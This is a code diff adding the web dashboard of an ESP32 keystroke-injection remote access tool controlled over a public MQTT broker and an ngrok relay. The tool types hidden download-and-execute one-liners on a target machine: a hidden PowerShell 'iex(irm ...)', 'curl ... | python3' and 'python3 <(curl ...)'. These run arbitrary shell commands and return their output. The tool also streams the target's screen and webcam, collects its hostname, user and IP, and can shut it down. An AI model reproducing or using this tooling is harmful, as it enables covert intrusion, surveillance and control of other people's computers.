+        <div class="kbtn" onclick="runCmd('lsusb | grep -i -E &quot;cam|capture|video|hdmi&quot;')">USB list</div>
+        <!-- auto-detect first real capture device and store as $CAM -->
+        <div class="kbtn" style="grid-column:span 3"
+             onclick="runCmd('CAM=$(for d in /dev/video*; do v4l2-ctl -d $d --info 2>/dev/null | grep -q &quot;Video Capture&quot; &amp;&amp; echo $d &amp;&amp; break; done); echo &quot;Capture device: ${CAM:-none found}&quot;')">auto-detect capture</div>
+
+        <div style="grid-column:span 3;font-size:.65em;color:var(--fg2);padding:5px 0 2px;border-top:1px solid var(--border);letter-spacing:.05em;">📋 DEVICE INFO</div>
+        <div class="kbtn" onclick="runCmd('v4l2-ctl --list-devices 2>/dev/null || echo install: apt install v4l-utils')">v4l2 devices</div>
+        <!-- list supported formats: works on any capture card regardless of device node -->
+        <div class="kbtn" onclick="runCmd('v4l2-ctl -d /dev/video0 --list-formats-ext 2>/dev/null | head -40')">list formats</div>
+        <div class="kbtn" onclick="runCmd('v4l2-ctl -d /dev/video0 --list-ctrls 2>/dev/null | head -30')">cam controls</div>
+        <!-- show input signal (HDMI lock status) -->
+        <div class="kbtn" onclick="runCmd('v4l2-ctl -d /dev/video0 --get-input 2>/dev/null; v4l2-ctl -d /dev/video0 -V 2>/dev/null')">signal info</div>
+        <div class="kbtn" onclick="runCmd('ffmpeg -hide_banner -f v4l2 -list_formats all -i /dev/video0 2>&1 | grep -v &quot;^ffmpeg&quot;')">ffmpeg formats</div>
+        <div class="kbtn" onclick="runCmd('sudo apt install -y ffmpeg v4l-utils 2>&1 | tail -3')">install tools</div>
+
+        <div style="grid-column:span 3;font-size:.65em;color:var(--fg2);padding:5px 0 2px;border-top:1px solid var(--border);letter-spacing:.05em;">📸 CAPTURE</div>
+        <!-- snap: auto pixel_format — works for YUYV, MJPEG and H264 capture cards -->
+        <div class="kbtn" onclick="runCmd('ffmpeg -hide_banner -f v4l2 -i /dev/video0 -frames:v 1 -q:v 2 /tmp/snap.jpg -y 2>&1 | tail -3 &amp;&amp; ls -lh /tmp/snap.jpg')">snap (auto)</div>
+        <!-- snap HD: set explicit 1280x720 for HDMI cards that need it -->
+        <div class="kbtn" onclick="runCmd('ffmpeg -hide_banner -f v4l2 -video_size 1280x720 -i /dev/video0 -frames:v 1 -q:v 2 /tmp/snap_hd.jpg -y 2>&1 | tail -3')">snap 720p</div>
+        <!-- snap FHD: 1920x1080 — only works if card supports it -->
+        <div class="kbtn" onclick="runCmd('ffmpeg -hide_banner -f v4l2 -video_size 1920x1080 -i /dev/video0 -frames:v 1 -q:v 2 /tmp/snap_fhd.jpg -y 2>&1 | tail -3')">snap 1080p</div>
+        <!-- record: use libx264 at lower crf for compatibility; 15fps is safe for HDMI cards -->
+        <div class="kbtn" onclick="runCmd('ffmpeg -hide_banner -f v4l2 -i /dev/video0 -t 10 -c:v libx264 -preset ultrafast -crf 28 /tmp/clip.mp4 -y 2>&1 | tail -3')">record 10s</div>
+        <!-- record HDMI at 1080p@15fps — safe framerate for USB 2.0 HDMI capture cards -->
+        <div class="kbtn" onclick="runCmd('ffmpeg -hide_banner -f v4l2 -video_size 1920x1080 -framerate 15 -i /dev/video0 -t 5 -c:v libx264 -preset ultrafast -crf 30 /tmp/hdmi.mp4 -y 2>&1 | tail -3')">record HDMI 5s</div>
+        <div class="kbtn" onclick="runCmd('ls -lh /tmp/snap*.jpg /tmp/clip.mp4 /tmp/hdmi.mp4 2>/dev/null')">saved files</div>
+
+        <div style="grid-column:span 3;font-size:.65em;color:var(--fg2);padding:5px 0 2px;border-top:1px solid var(--border);letter-spacing:.05em;">🖥 SCREEN GRAB (X11)</div>
+        <!-- x11grab: needs DISPLAY, works when target has a desktop session -->
+        <div class="kbtn" onclick="runCmd('DISPLAY=:0 ffmpeg -hide_banner -f x11grab -video_size $(xdpyinfo -display :0 2>/dev/null | grep dim | awk &quot;{print $2}&quot; | head -1 || echo 1920x1080) -framerate 1 -i :0.0 -frames:v 1 /tmp/screen.jpg -y 2>&1 | tail -3')">x11 screenshot</div>
+        <div class="kbtn" onclick="runCmd('DISPLAY=:0 scrot -q 70 /tmp/screen.jpg 2>&amp;1 &amp;&amp; ls -lh /tmp/screen.jpg || echo apt install scrot')">scrot snap</div>
+        <div class="kbtn" onclick="runCmd('DISPLAY=:0 xrandr 2>/dev/null | head -15')">displays</div>
+
+        <div style="grid-column:span 3;font-size:.65em;color:var(--fg2);padding:5px 0 2px;border-top:1px solid var(--border);letter-spacing:.05em;">⚡ POWER</div>
+        <div class="kbtn" style="border-color:var(--red);color:var(--red);"
+             onclick="runCmd('sudo shutdown -h now')">shutdown</div>
+        <div class="kbtn" style="border-color:var(--amber);color:var(--amber);"
+             onclick="runCmd('sudo reboot')">reboot</div>
+        <div class="kbtn" onclick="runCmd('sudo shutdown -h +1')">shutdown in 1m</div>
+      </div>
+    </div>
+
+    <!-- Custom command input -->
+    <div class="type-row" style="margin-bottom:6px;">
+      <input id="shellCmd" placeholder="Any command — ls, whoami, ipconfig, Get-Process …"
+             autocomplete="off" spellcheck="false"
+             onkeydown="if(event.key==='Enter'){runCustomCmd();event.preventDefault();}">
+      <button class="btn btn-primary" id="btnRunCmd" onclick="runCustomCmd()">Run</button>
+    </div>
+    <div style="font-size:.72em;color:var(--fg2);">
+      Command stored on Pi → ESP32 types a short launcher on target → target fetches + executes + sends output back.
+    </div>
+  </div>
+
+  <!-- Output terminal -->
+  <div class="card">
+    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;padding-bottom:8px;border-bottom:1px solid var(--border);">
+      <span style="font-size:.7em;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:var(--fg2);">Output</span>
+      <span style="font-size:.7em;color:var(--fg2);cursor:pointer;" onclick="clearShellOutput()">Clear</span>
+    </div>
+    <div id="shellOutput"
+         style="background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:10px;
+                font-family:inherit;font-size:.8em;min-height:180px;max-height:420px;overflow-y:auto;
+                scrollbar-width:thin;scrollbar-color:var(--border) transparent;
+                white-space:pre-wrap;word-break:break-all;color:var(--green);">
+<span style="color:var(--fg2);">Run a command above — output appears here.</span>
+    </div>
+  </div>
+
+</div><!-- end tab-shell -->
+
+<script>
+// ── config ──────────────────────────────────────────────────────────────────
+const DEFAULT_SUFFIX = '1d1308';
+const BROKER_URL = 'wss://broker.hivemq.com:8884/mqtt';
+const LS_TOPIC  = 'esp32hid_topic';
+const LS_MACROS = 'esp32hid_macros';
+
+// ── state ───────────────────────────────────────────────────────────────────
+let client = null;
+let cmdTopic = '';
+let statusTopic = '';
+let lastEspSeen = 0;
+let macros = [];
+
+// ── init ─────────────────────────────────────────────────────────────────────
+function getSuffix() {
+  try { return localStorage.getItem(LS_TOPIC) || DEFAULT_SUFFIX; } catch(e) { return DEFAULT_SUFFIX; }
+}
+function setSuffix(v) {
+  try { localStorage.setItem(LS_TOPIC, v); } catch(e) {}
+}
+
+function buildTopics(suffix) {
+  suffix = suffix.trim().toLowerCase().replace(/^esp32hid\//,'');
+  cmdTopic    = 'esp32hid/' + suffix + '/cmd';
+  statusTopic = 'esp32hid/' + suffix + '/status';
+  document.getElementById('topicInput').value = 'esp32hid/' + suffix;
+  setSuffix(suffix);
+}
+
+function reconnect() {
+  const raw = document.getElementById('topicInput').value.trim();
+  const suffix = raw.replace(/^esp32hid\//,'').replace(/\/.*$/,'') || DEFAULT_SUFFIX;
+  buildTopics(suffix);
+  if (client) { try { client.end(true); } catch(e) {} }
+  connect();
+}
+
+function connect() {
+  setStatus('connecting');
+  log('Connecting to ' + BROKER_URL + '…', 'info');
+
+  const clientId = 'web-' + Math.random().toString(16).substr(2, 8);
+  client = mqtt.connect(BROKER_URL, {
+    clientId,
+    clean: true,
+    connectTimeout: 8000,
+    reconnectPeriod: 5000,
+  });
+
+  client.on('connect', () => {
+    setStatus('connected');
+    log('MQTT connected · id=' + clientId, 'ok');
+    client.subscribe(statusTopic, (err) => {
+      if (!err) log('Subscribed: ' + statusTopic, 'info');
+    });
+  });
+
+  client.on('disconnect', () => { setStatus('disconnected'); log('MQTT disconnected', 'warn'); });
+  client.on('error', (err) => { setStatus('error'); log('MQTT error: ' + err.message, 'err'); });
+  client.on('reconnect', () => { setStatus('connecting'); log('Reconnecting…', 'warn'); });
+  client.on('offline', () => { setStatus('disconnected'); log('MQTT offline', 'warn'); });
+
+  client.on('message', (topic, payload) => {
+    if (topic !== statusTopic) return;
+    try {
+      const msg = JSON.parse(payload.toString());
+      lastEspSeen = Date.now();
+      setBadge('badgeEsp', 'ESP32: ' + (msg.ssid || 'online'), 'green');
+    } catch(e) {
+      lastEspSeen = Date.now();
+      setBadge('badgeEsp', 'ESP32: online', 'green');
+    }
+  });
+}
+
+function setStatus(s) {
+  const dot  = document.getElementById('mqttDot');
+  const badge = document.getElementById('badgeMqtt');
+  dot.className = 'dot';
+  badge.className = 'badge';
+  if (s === 'connected')    { dot.classList.add('on');  badge.classList.add('green'); badge.textContent = 'MQTT: connected'; }
+  else if (s === 'connecting') { dot.classList.add('mid'); badge.classList.add('amber'); badge.textContent = 'MQTT: connecting…'; }
+  else { badge.classList.add('red'); badge.textContent = 'MQTT: ' + s; }
+}
+
+// ── publish ──────────────────────────────────────────────────────────────────
+function publish(payload) {
+  if (!client || !client.connected) {
+    log('Not connected!', 'err');
+    return false;
+  }
+  const msg = JSON.stringify(payload);
+  client.publish(cmdTopic, msg, { qos: 0 });
+  log('→ ' + msg.substring(0, 80), 'ok');
+  return true;
+}
+
+// ── HID commands ─────────────────────────────────────────────────────────────
+function sendType() {
+  const el = document.getElementById('typeText');
+  const t  = el.value.trim();
+  if (!t) return;
+  if (publish({ type: 'type', text: t })) el.value = '';
+}
+
+function key(k) { publish({ type: 'keypress', key: k }); }
+
+function combo(mods, k) { publish({ type: 'combo', modifiers: mods, key: k }); }
+
+function mouseClick(b) { publish({ type: 'mouseclick', button: b }); }
+
+function mouseMove(x, y) { publish({ type: 'mousemove', x, y }); }
+
+function mouseScroll(delta) { publish({ type: 'mousescroll', delta }); }
+
+// ── macros ───────────────────────────────────────────────────────────────────
+function loadMacros() {
+  try { macros = JSON.parse(localStorage.getItem(LS_MACROS)) || []; } catch(e) { macros = []; }
+  renderMacros();
+}
+
+function saveMacros() {
+  try { localStorage.setItem(LS_MACROS, JSON.stringify(macros)); } catch(e) {}
+}
+
+function addMacro() {
+  const el = document.getElementById('newMacro');
+  const t  = el.value.trim();
+  if (!t) return;
+  macros.push(t);
+  saveMacros();
+  renderMacros();
+  el.value = '';
+}
+
+function deleteMacro(i) {
+  macros.splice(i, 1);
+  saveMacros();
+  renderMacros();
+}
+
+function renderMacros() {
+  const list = document.getElementById('macroList');
+  list.innerHTML = '';
+  macros.forEach((m, i) => {
+    const row = document.createElement('div');
+    row.className = 'macro-row';
+    row.innerHTML = `
+      <button class="btn" style="flex:1;text-align:left;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;"
+              onclick="publish({type:'type',text:${JSON.stringify(m)}})">${escHtml(m)}</button>
+      <button class="btn" style="color:var(--red);border-color:var(--red);padding:8px 10px"
+              onclick="deleteMacro(${i})">✕</button>
+    `;
+    list.appendChild(row);
+  });
+  if (macros.length === 0) {
+    list.innerHTML = '<div style="color:var(--fg2);font-size:.78em;padding:4px 0;">No macros saved. Add text below.</div>';
+  }
+}
+
+// ── log ──────────────────────────────────────────────────────────────────────
+function log(msg, type) {
+  const body = document.getElementById('logBody');
+  const row  = document.createElement('div');
+  row.className = 'log-entry log-' + (type || 'info');
+  const ts = new Date().toLocaleTimeString('en-GB', {hour12:false});
+  row.innerHTML = `<span class="log-ts">${ts}</span><span class="log-msg">${escHtml(msg)}</span>`;
+  body.prepend(row);
+  while (body.children.length > 100) body.removeChild(body.lastChild);
+}
+
+function clearLog() { document.getElementById('logBody').innerHTML = ''; }
+
+// ── badges ───────────────────────────────────────────────────────────────────
+function setBadge(id, text, color) {
+  const el = document.getElementById(id);
+  el.textContent = text;
+  el.className = 'badge ' + (color || '');
+}
+
+// ── util ─────────────────────────────────────────────────────────────────────
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+// ── esp32 heartbeat check ─────────────────────────────────────────────────────
+setInterval(() => {
+  if (lastEspSeen && Date.now() - lastEspSeen > 60000) {
+    setBadge('badgeEsp', 'ESP32: offline', 'red');
+  }
+}, 10000);
+
+// ── tabs ─────────────────────────────────────────────────────────────────────
+const TAB_NAMES = ['controls', 'screen', 'shell'];
+let _activeTab = 'controls';
+let _screenPollTimer = null;
+
+function switchTab(name) {
+  _activeTab = name;
+  document.querySelectorAll('.tab').forEach((t, i) => {
+    t.classList.toggle('active', TAB_NAMES[i] === name);
+  });
+  document.querySelectorAll('.tab-panel').forEach(p => {
+    p.classList.toggle('active', p.id === 'tab-' + name);
+  });
+  // Start/stop screen polling based on active tab
+  if (name === 'screen') {
+    pollScreenshot(); updateOsHint();
+    if (!_screenPollTimer) _screenPollTimer = setInterval(pollScreenshot, 3000);
+  } else {
+    if (_screenPollTimer && !_liveActive) { clearInterval(_screenPollTimer); _screenPollTimer = null; }
+  }
+  if (name === 'shell') { pollShellOutput(); startDevicePoll(); }
+  else { clearInterval(_devPollTimer); _devPollTimer = null; }
+}
+
+// ── OS config ─────────────────────────────────────────────────────────────────
+const RELAY_BASE = window.location.origin;
+
+const OS_CONFIG = {
+  windows: {
+    label: 'Windows',
+    oneShot: () => winRun(`powershell -w hidden "iex(irm '${RELAY_BASE}/ps/win')"`),
+    live:    () => winRun(`powershell -w hidden "iex(irm '${RELAY_BASE}/ps/win-live')"`),
+    hint: `ESP32 presses <strong>Win+R</strong> → types a hidden PowerShell one-liner → the script takes a JPEG screenshot and POSTs it here.<br>
+           Live mode starts a loop on the target (1 fps) that you can stop remotely.<br>
+           <strong>Requires:</strong> Windows 10+, internet access to the relay URL.`,
+  },
+  linux: {
+    label: 'Linux / Kali',
+    oneShot: () => termRun('linux', `bash -c "curl -s '${RELAY_BASE}/sh/linux'|python3 &"`),
+    live:    () => termRun('linux', `bash -c "curl -s '${RELAY_BASE}/sh/linux-live'|python3 &"`),
+    hint: `ESP32 opens a terminal (<strong>Ctrl+Alt+T</strong>), types a curl+python3 command that captures the screen via <em>scrot</em> or <em>ImageMagick</em> and POSTs it here.<br>
+           Live mode runs a 1 fps loop. Stop it from the UI.<br>
+           <strong>Requires:</strong> X11 session, <code>scrot</code> or <code>import</code> (ImageMagick), Python 3, internet access.`,
+  },
+  macos: {
+    label: 'macOS',
+    oneShot: () => spotlightRun(`python3 <(curl -s '${RELAY_BASE}/sh/mac')`),
+    live:    () => spotlightRun(`python3 <(curl -s '${RELAY_BASE}/sh/mac-live')`),
+    hint: `ESP32 opens Spotlight (<strong>Cmd+Space</strong>), launches Terminal, and runs a <em>screencapture</em> command.<br>
+           <strong>Requires:</strong> macOS 10.13+, Python 3, internet access.`,
+  },
+  auto: {
+    label: 'Auto-detect',
+    oneShot: () => autoDetectCapture(false),
+    live:    () => autoDetectCapture(true),
+    hint: `Tries <strong>Windows first</strong> (Win+R + PowerShell). If no screenshot arrives in 20 s, retries with <strong>Linux</strong> (Ctrl+Alt+T + bash). Select a specific OS to skip detection.`,
+  },
+  camera: {
+    label: 'IP Camera',
+    oneShot: null, live: null,
+    hint: `Paste an MJPEG/HTTP camera URL — e.g. from the Android <strong>IP Webcam</strong> app, an ESP32-CAM, or any MJPEG source.<br>
+           The stream plays directly in the browser; no ESP32 commands involved.`,
+  },
+};
+
+function getOs() { return document.getElementById('osSelect').value; }
+
+function onOsChange() {
+  const os = getOs();
+  const isCamera = os === 'camera';
+  document.getElementById('captureButtons').style.display = isCamera ? 'none' : 'flex';
+  document.getElementById('screenshotView').hidden = isCamera;
+  document.getElementById('cameraView').hidden     = !isCamera;
+  updateOsHint();
+  if (_liveActive) stopLive();
+}
+
+function updateOsHint() {
+  const cfg = OS_CONFIG[getOs()];
+  if (!cfg) return;
+  document.getElementById('osHintTitle').textContent = cfg.label + ' — how it works';
+  document.getElementById('osHintBody').innerHTML    = cfg.hint;
+}
+
+// ── Payload helpers ───────────────────────────────────────────────────────────
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+async function winRun(cmd) {
+  publish({ type: 'combo', modifiers: ['WIN'], key: 'R' });
+  await sleep(900);
+  publish({ type: 'type', text: cmd });
+  await sleep(200);
+  publish({ type: 'keypress', key: 'ENTER' });
+}
+
+async function termRun(os, cmd) {
+  // Ctrl+Alt+T  (GNOME / most Linux DEs)
+  publish({ type: 'combo', modifiers: ['CTRL','ALT'], key: 'T' });
+  await sleep(1800);
+  publish({ type: 'type', text: cmd });
+  await sleep(200);
+  publish({ type: 'keypress', key: 'ENTER' });
+}
+
+async function spotlightRun(cmd) {
+  publish({ type: 'combo', modifiers: ['WIN'], key: ' ' });  // Cmd+Space via WIN key
+  await sleep(900);
+  publish({ type: 'type', text: 'Terminal' });
+  await sleep(800);
+  publish({ type: 'keypress', key: 'ENTER' });
+  await sleep(1200);
+  publish({ type: 'type', text: cmd });
+  await sleep(200);
+  publish({ type: 'keypress', key: 'ENTER' });
+}
+
+// ── Auto-detect ───────────────────────────────────────────────────────────────
+let _autoPhase = 0;
+
+async function autoDetectCapture(wantLive) {
+  _autoPhase = 1;
+  const prog = document.getElementById('autoProgress');
+  prog.hidden = false;
+  prog.textContent = '⚡ Phase 1/2 — trying Windows (Win+R + PowerShell)…';
+
+  const cfg = OS_CONFIG.windows;
+  wantLive ? await cfg.live() : await cfg.oneShot();
+
+  const framesBefore = _lastFrame;
+  const deadline = Date.now() + 20000;
+
+  const check = async () => {
+    if (_lastFrame > framesBefore) {
+      prog.textContent = '✓ Windows detected — screenshot received.';
+      setTimeout(() => { prog.hidden = true; }, 3000);
+      _autoPhase = 0;
+      return;
+    }
+    if (Date.now() < deadline) { setTimeout(check, 1000); return; }
+
+    // Phase 2: Linux
+    _autoPhase = 2;
+    prog.textContent = '⚡ Phase 2/2 — trying Linux / Kali (Ctrl+Alt+T + bash)…';
+    const lcfg = OS_CONFIG.linux;
+    wantLive ? await lcfg.live() : await lcfg.oneShot();
+
+    const deadline2 = Date.now() + 20000;
+    const check2 = async () => {
+      if (_lastFrame > framesBefore) {
+        prog.textContent = '✓ Linux detected — screenshot received.';
+        setTimeout(() => { prog.hidden = true; }, 3000);
+        _autoPhase = 0;
+        return;
+      }
+      if (Date.now() < deadline2) { setTimeout(check2, 1000); return; }
+      prog.textContent = '✗ Auto-detect failed. Select target OS manually.';
+      prog.style.color = 'var(--red)';
+      _autoPhase = 0;
+    };
+    setTimeout(check2, 2000);
+  };
+  setTimeout(check, 5000);
+}
+
+// ── Capture / Live ────────────────────────────────────────────────────────────
+let _lastScreenTs = 0;
+let _lastFrame    = 0;
+let _awaitingCapture = false;
+let _liveActive   = false;
+let _liveTimer    = null;
+
+async function captureNow() {
+  if (!client || !client.connected) { log('Not connected to MQTT', 'err'); return; }
+  const cfg = OS_CONFIG[getOs()];
+  if (!cfg || !cfg.oneShot) return;
+
+  document.getElementById('btnCapture').disabled = true;
+  document.getElementById('screenSpinner').hidden = false;
+  setStatus(''); setCaptureStatus('Sending payload…');
+  _awaitingCapture = true;
+
+  await cfg.oneShot();
+  log('Capture payload sent (' + (OS_CONFIG[getOs()]?.label || getOs()) + ')', 'info');
+  awaitFrame(25000);
+}
+
+function awaitFrame(timeoutMs) {
+  const frameBefore = _lastFrame;
+  const deadline    = Date.now() + timeoutMs;
+  const poll = async () => {
+    if (!_awaitingCapture) return;
+    if (_lastFrame > frameBefore) {
+      _awaitingCapture = false;
+      document.getElementById('btnCapture').disabled = false;
+      document.getElementById('screenSpinner').hidden = true;
+      setCaptureStatus('');
+      return;
+    }
+    if (Date.now() > deadline) {
+      _awaitingCapture = false;
+      document.getElementById('btnCapture').disabled = false;
+      document.getElementById('screenSpinner').hidden = true;
+      setCaptureStatus('Timeout — check target.');
+      log('Capture timed out. Check target has internet + correct OS selected.', 'err');
+      return;
+    }
+    setTimeout(poll, 800);
+  };
+  setTimeout(poll, 2500);
+}
+
+async function toggleLive() {
+  if (_liveActive) { stopLive(); return; }
+
+  if (!client || !client.connected) { log('Not connected to MQTT', 'err'); return; }
+  const cfg = OS_CONFIG[getOs()];
+  if (!cfg || !cfg.live) return;
+
+  // Tell server: clear stop flag
+  try { await fetch(RELAY_BASE + '/api/live-ctrl', { method:'POST', headers:{'Content-Type':'application/json'}, body:'{"action":"start"}' }); } catch(e) {}
+
+  _liveActive = true;
+  document.getElementById('btnLive').textContent = '■ Stop Live';
+  document.getElementById('btnLive').style.cssText = 'background:var(--red);border-color:var(--red);color:#fff;min-width:80px;';
+  document.getElementById('btnCapture').disabled = true;
+  setCaptureStatus('Live 1 fps');
+
+  await cfg.live();
+  log('Live loop started on target', 'ok');
+
+  // Poll for new frames — 1500ms keeps ngrok under rate limit
+  _liveTimer = setInterval(pollScreenshot, 1500);
+}
+
+async function stopLive() {
+  _liveActive = false;
+  if (_liveTimer) { clearInterval(_liveTimer); _liveTimer = null; }
+
+  // Tell server: set stop flag (target loop will exit)
+  try { await fetch(RELAY_BASE + '/api/live-ctrl', { method:'POST', headers:{'Content-Type':'application/json'}, body:'{"action":"stop"}' }); } catch(e) {}
+
+  document.getElementById('btnLive').textContent = '▶ Live';
+  document.getElementById('btnLive').style.cssText = 'min-width:80px;';
+  document.getElementById('btnCapture').disabled = false;
+  setCaptureStatus('');
+  log('Live stopped', 'info');
+}
+
+// ── Screenshot display ────────────────────────────────────────────────────────
+async function loadScreenshot(ts, frame, osName) {
+  const img = document.getElementById('screenImg');
+  img.src = RELAY_BASE + '/api/screenshot?t=' + ts;
+  await new Promise((res) => { img.onload = res; img.onerror = res; });
+  document.getElementById('screenEmpty').hidden = true;
+  img.hidden = false;
+  _lastScreenTs = ts;
+  _lastFrame    = frame;
+  const d = new Date(ts * 1000);
+  document.getElementById('screenTs').textContent = 'Captured: ' + d.toLocaleTimeString() + (osName && osName !== '?' ? '  ·  ' + osName : '');
+  document.getElementById('frameCounter').textContent = 'Frame #' + frame;
+}
+
+let _pollScreenshotBusy = false;
+async function pollScreenshot() {
+  if (_pollScreenshotBusy) return;   // don't pile up requests
+  _pollScreenshotBusy = true;
+  try {
+    const r = await fetch(RELAY_BASE + '/api/screenshot/info');
+    const j = await r.json();
+    if (j.available && j.frame > _lastFrame) {
+      await loadScreenshot(j.ts, j.frame, j.os);
+    }
+  } catch(e) {} finally { _pollScreenshotBusy = false; }
+}
+
+function setCaptureStatus(t) {
+  document.getElementById('captureStatus').textContent = t;
+}
+
+// ── IP Camera (server-side proxy — works from anywhere) ───────────────────────
+async function setCameraUrl() {
+  const url = document.getElementById('camUrl').value.trim();
+  if (!url) return;
+  document.getElementById('camStatus').textContent = 'Configuring proxy…';
+
+  try {
+    await fetch(RELAY_BASE + '/api/cam/set', {
+      method: 'POST', headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({url})
+    });
+  } catch(e) {
+    document.getElementById('camStatus').textContent = 'Error: ' + e.message;
+    return;
+  }
+
+  // Load stream through server proxy
+  const img  = document.getElementById('camImg');
+  const bust = '?t=' + Date.now();
+  img.src    = RELAY_BASE + '/api/cam/stream' + bust;
+  img.hidden = false;
+  document.getElementById('camEmpty').hidden = true;
+  document.getElementById('camStatus').textContent = 'Streaming via Pi proxy → ngrok';
+
+  img.onerror = () => {
+    document.getElementById('camStatus').textContent = '✗ Stream failed. Check the camera URL is reachable from the Pi.';
+    document.getElementById('camEmpty').textContent  = 'Stream error — check URL and Pi network.';
+    document.getElementById('camEmpty').hidden = false;
+    img.hidden = true;
+  };
+}
+
+async function camSnap() {
+  document.getElementById('camStatus').textContent = 'Fetching snapshot…';
+  try {
+    const r = await fetch(RELAY_BASE + '/api/cam/snap');
+    if (!r.ok) { document.getElementById('camStatus').textContent = 'Snapshot failed: ' + r.status; return; }
+    const blob = await r.blob();
+    const url  = URL.createObjectURL(blob);
+    const img  = document.getElementById('camImg');
+    img.src    = url;
+    img.hidden = false;
+    document.getElementById('camEmpty').hidden = true;
+    document.getElementById('camStatus').textContent = 'Snapshot — ' + new Date().toLocaleTimeString();
+  } catch(e) {
+    document.getElementById('camStatus').textContent = 'Error: ' + e.message;
+  }
+}
+
+// Restore saved camera URL on load
+async function restoreCamUrl() {
+  try {
+    const r = await fetch(RELAY_BASE + '/api/cam/info');
+    const j = await r.json();
+    if (j.url) document.getElementById('camUrl').value = j.url;
+  } catch(e) {}
+}
+
+// ── Fullscreen ────────────────────────────────────────────────────────────────
+function toggleFullscreen(el) {
+  if (!document.fullscreenElement) el.requestFullscreen().catch(() => {});
+  else document.exitFullscreen();
+}
+
+// ── Shell command execution ────────────────────────────────────────────────────
+let _shellPolling = false;
+
+function getShellOs() { return document.getElementById('shellOsSelect').value; }
+
+function onShellOsChange() {
+  const os = getShellOs();
+  document.getElementById('quickWin').style.display    = os === 'windows' ? 'grid' : 'none';
+  document.getElementById('quickLinux').style.display  = os === 'linux'   ? 'grid' : 'none';
+  document.getElementById('quickMac').style.display    = os === 'macos'   ? 'grid' : 'none';
+  document.getElementById('quickCamera').style.display = os === 'camera'  ? 'grid' : 'none';
+}
+
+// Map "camera" OS selection to linux launcher on firmware side
+function shellMqttOs() {
+  const os = getShellOs();
+  return os === 'camera' ? 'linux' : os;
+}
+
+function runCmd(cmd) {
+  document.getElementById('shellCmd').value = cmd;
+  runCustomCmd();
+}
+
+async function runCustomCmd() {
+  const cmd = document.getElementById('shellCmd').value.trim();
+  if (!cmd) return;
+  const os      = getShellOs();
+  const mqttOs  = shellMqttOs();   // "camera" maps to "linux"
+  const btn = document.getElementById('btnRunCmd');
+  const st  = document.getElementById('shellPollStatus');
+  btn.disabled = true;
+  st.textContent = '⌛ Sending…';
+  st.style.color = 'var(--amber)';
+
+  // 1. Store command on relay
+  let cmdId = 0;
+  try {
+    const r = await fetch(RELAY_BASE + '/api/shell/exec', {
+      method: 'POST', headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({cmd, os: mqttOs})
+    });
+    cmdId = (await r.json()).id;
+  } catch(e) {
+    st.textContent = '✗ Relay error';
+    st.style.color = 'var(--red)';
+    btn.disabled = false;
+    return;
+  }
+
+  // 2. Tell ESP32 to open terminal and run the launcher
+  if (!publish({type: 'shell', os: mqttOs})) {
+    st.textContent = '✗ MQTT not connected';
+    st.style.color = 'var(--red)';
+    btn.disabled = false;
+    return;
+  }
+
+  st.textContent = '⌛ Waiting for target…';
+  log('Shell → ' + os + (os !== mqttOs ? ' (via ' + mqttOs + ')' : '') + ': ' + cmd.substring(0, 60), 'info');
+
+  // 3. Poll for output — match by id
+  _shellPolling = true;
+  const deadline = Date.now() + 50000;
+  const poll = async () => {
+    if (!_shellPolling) return;
+    try {
+      const hist = await (await fetch(RELAY_BASE + '/api/shell/output')).json();
+      if (hist.length && hist[0].id === cmdId) {
+        showShellOutput(hist[0]);
+        _shellPolling = false;
+        btn.disabled = false;
+        st.textContent = '✓ Done';
+        st.style.color = 'var(--green)';
+        return;
+      }
+    } catch(e) {}
+    if (Date.now() > deadline) {
+      _shellPolling = false;
+      btn.disabled = false;
+      st.textContent = '✗ Timeout';
+      st.style.color = 'var(--red)';
+      return;
+    }
+    setTimeout(poll, 1500);
+  };
+  setTimeout(poll, 4000);
+}
+
+function showShellOutput(entry) {
+  const el  = document.getElementById('shellOutput');
+  const hdr = `[${entry.ts}] [${entry.os||'?'}] $ ${entry.cmd}\n${'─'.repeat(52)}\n`;
+  el.textContent = hdr + (entry.out || '(no output)');
+  el.scrollTop = 0;
+}
+
+let _pollShellBusy = false;
+async function pollShellOutput() {
+  if (_pollShellBusy) return;
+  _pollShellBusy = true;
+  try {
+    const hist = await (await fetch(RELAY_BASE + '/api/shell/output')).json();
+    if (hist.length) showShellOutput(hist[0]);
+  } catch(e) {} finally { _pollShellBusy = false; }
+}
+
+// ── Device info polling ───────────────────────────────────────────────────────
+let _devPollTimer = null;
+let _pollDevBusy = false;
+async function pollDeviceInfo() {
+  if (_pollDevBusy) return;
+  _pollDevBusy = true;
+  try {
+    const d = await (await fetch(RELAY_BASE + '/api/device-info')).json();
+    const banner    = document.getElementById('deviceBanner');
+    const bannerOff = document.getElementById('deviceBannerOff');
+    const badgeTarget = document.getElementById('badgeTarget');
+    if (d.connected) {
+      banner.style.display    = '';
+      bannerOff.style.display = 'none';
+      document.getElementById('devHost').textContent = '🖥 ' + (d.hostname || '?');
+      document.getElementById('devOs').textContent   = d.os   || '';
+      document.getElementById('devUser').textContent = '👤 ' + (d.user || '?');
+      document.getElementById('devIp').textContent   = '🌐 ' + (d.ip   || '?');
+      document.getElementById('devArch').textContent = d.arch || '';
+      document.getElementById('devAgo').textContent  = d.ago < 5 ? 'just now' : d.ago + 's ago';
+      badgeTarget.style.display = '';
+      badgeTarget.className     = 'badge green';
+      badgeTarget.textContent   = 'TARGET: ' + (d.hostname || d.ip || 'connected');
+    } else {
+      banner.style.display    = 'none';
+      bannerOff.style.display = '';
+      badgeTarget.style.display = d.hostname ? '' : 'none';
+      if (d.hostname) {
+        badgeTarget.className   = 'badge amber';
+        badgeTarget.textContent = 'TARGET: offline (' + (d.hostname||'?') + ')';
+      }
+    }
+  } catch(e) {} finally { _pollDevBusy = false; }
+}
+function startDevicePoll() {
+  pollDeviceInfo();
+  clearInterval(_devPollTimer);
+  _devPollTimer = setInterval(pollDeviceInfo, 10000); // 10s — no need to hammer ngrok
+}
+// poll once on load for the header badge; continuous poll only when Shell tab is open
+pollDeviceInfo();
+
+function clearShellOutput() {
